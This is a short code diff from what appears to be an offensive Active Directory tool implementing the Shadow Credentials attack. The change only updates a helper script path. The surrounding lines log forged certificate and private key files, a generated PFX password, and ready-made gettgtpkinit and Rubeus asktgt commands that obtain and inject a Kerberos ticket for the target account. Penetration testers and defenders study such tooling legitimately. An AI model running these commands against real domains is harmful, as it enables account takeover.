@@ -126,7 +126,7 @@ class ShadowCredentials(object):
                     logging.critical("Saved PEM private key at path: %s" % path + "_priv.pem")
                     logging.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     logging.critical("Run the following command to obtain a TGT")
-                    logging.critical("python comm/reqtgt/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache -dc-ip %s" % (path, path, domain, self.target_samname, path, dc_ip))
+                    logging.critical("python comm/ticket/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache -dc-ip %s" % (path, path, domain, self.target_samname, path, dc_ip))
                 elif export_type == "PFX":
                     if password is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
@@ -137,7 +137,7 @@ class ShadowCredentials(object):
                     logging.critical("Must be used with password: %s" % password)
                     logging.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     logging.critical("Run the following command to obtain a TGT")
-                    logging.critical("python comm/reqtgt/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache -dc-ip %s" % (path, password, domain, self.target_samname, path, dc_ip))
+                    logging.critical("python comm/ticket/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache -dc-ip %s" % (path, password, domain, self.target_samname, path, dc_ip))
                     logging.critical("Rubeus.exe asktgt /user:{} /certificate:{}.pfx /password:{} /outfile:{}.tgt /enctype:aes256 /opsec /ptt".format(self.target_samname, path, password, self.target_samname))
             else:
                 if self.ldap_session.result['result'] == 50:
